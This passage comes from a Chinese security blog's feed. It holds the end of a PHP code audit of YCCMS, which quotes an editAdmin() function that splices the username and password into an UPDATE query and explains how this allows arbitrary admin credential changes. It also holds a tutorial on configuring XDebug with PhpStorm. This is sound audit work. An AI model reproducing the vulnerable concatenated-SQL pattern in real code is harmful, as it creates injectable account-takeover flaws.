invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码未修改!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>            &#125;<br>        &#125;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br>            <span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到前面都是一些判断，重点关注下editAdmin()函数，该函数位于model\AdminModel.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editAdmin</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$_sql</span>=<span class="hljs-string">&quot;UPDATE</span><br><span class="hljs-string">                    my_admin</span><br><span class="hljs-string">                SET</span><br><span class="hljs-string">                    username=&#x27;<span class="hljs-subst">$this</span>-&gt;username&#x27;,</span><br><span class="hljs-string">                    password=&#x27;<span class="hljs-subst">$this</span>-&gt;password&#x27;</span><br><span class="hljs-string">                WHERE</span><br><span class="hljs-string">                    id=1</span><br><span class="hljs-string">                LIMIT 1&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$_sql</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>该函数的父类为Model, 位于model\Model.class.php，看一下update函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$_sql</span>)-&gt;<span class="hljs-title function_ invoke__">rowCount</span>();<br>    &#125;<br></code></pre></td></tr></table></figure><p>调用execute函数去执行sql语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            <span class="hljs-variable">$_stmt</span>=<span class="hljs-variable language_">$this</span>-&gt;_db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$_sql</span>);<br>            <span class="hljs-variable">$_stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>        &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;SQL语句:&#x27;</span>.<span class="hljs-variable">$_sql</span>.<span class="hljs-string">&#x27;&lt;br /&gt;错误信息:&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$_stmt</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一系列的操作主要是用来生成SQL语句然后执行SQL语句，editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id&#x3D;1的数据，这也就造成了任意更改管理员账号密码</p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP storm 配置 XDebug</title>
    <link href="/2025/07/08/PHP%20storm%20%E9%85%8D%E7%BD%AE%20XDebug/"/>
    <url>/2025/07/08/PHP%20storm%20%E9%85%8D%E7%BD%AE%20XDebug/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-storm-配置-XDebug"><a href="#PHP-storm-配置-XDebug" class="headerlink" title="PHP storm 配置 XDebug"></a>PHP storm 配置 XDebug</h1><p>在小皮面板找到对应版本，打开XDebug组件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957606.png" alt="20250708133948343"></p><p><strong>php.ini配置：（配置完成后重启服务）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957876.png" alt="20250708134137512"></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Xdebug]</span><br><span class="hljs-attr">zend_extension</span>=D:/CTF-Tools/phpstudy_pro/Extensions/php/php5.<span class="hljs-number">5.9</span>nts/ext/php_xdebug.dll<br><span class="hljs-attr">xdebug.collect_params</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.collect_return</span>=<span class="hljs-number">1</span><br><span class="hljs-attr">xdebug.auto_trace</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.trace_output_dir</span>=D:/CTF-Tools/phpstudy_pro/Extensions/php_log/php5.<span class="hljs-number">5.9</span>nts.xdebug.trace<br><span class="hljs-attr">xdebug.profiler_enable</span>=<span class="hljs-literal">Off</span><br><span class="hljs-attr">xdebug.profiler_output_dir</span>=<span class="hljs-string">&quot;D:\CTF-Tools\phpstudy_pro\Extensions\tmp\xdebug&quot;</span><br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br><span class="hljs-attr">xdebug.remote_host</span>=localhost<br><span class="hljs-attr">xdebug.remote_port</span>=<span class="hljs-number">9100</span><br><span class="hljs-attr">xdebug.remote_handler</span>=dbgp<br><span class="hljs-attr">xdebug.mode</span>=debug<br><span class="hljs-attr">xdebug.idekey</span> = PHPSTORM<br><span class="hljs-attr">xdebug.remote_enable</span>=<span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure><p><strong>接下来打开PHP storm设置：</strong></p><p>-&gt;PHP&gt;调试&gt;DBGp代理           </p><p>IDE 键：<strong>PHPSTORM</strong><code>xdebug.idekey = PHPSTORM</code></p><p>主机：<strong>localhost</strong><code>xdebug.remote_host=localhost</code></p><p>端口：<strong>9001</strong><code>xdebug.remote_port=9100</code></p><p>将端口对应 <code>xdebug.remote_port=9100</code> php.ini 配置为 <strong>9100</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080957897.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959634.png" alt="20250708134451487"></p><p>-&gt;PHP&gt;服务器    </p><p>名称：yccms （随意）</p><p>主机：<strong>localhost</strong><code>xdebug.remote_host=localhost</code></p><p>端口：80          （保持默认 80 即可）</p><p>调试器：<strong>Xdebug</strong></p><ul><li><input checked="" disabled="" type="checkbox"> 使用路径映射</li></ul><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959883.png" alt="20250708134711734"></p><p>运行一个新的 PHP web 配置</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080959990.png" alt="20250708134943149"></p><p>服务器：yccms（选择上一步配置好的服务器）</p><p>起始URL: <a href="http://localhost:7676/">http://localhost:7676</a>    （此处的端口对应上 xp 搭建网站时的端口）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000588.png" alt="20250708135039223"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000527.png" alt="20250708135256894"></p><p>验证一下：</p><p>除了下面的三个黄标，其他没有问题就可以正常使用调试了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508081000114.png" alt="20250708135357214"></p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
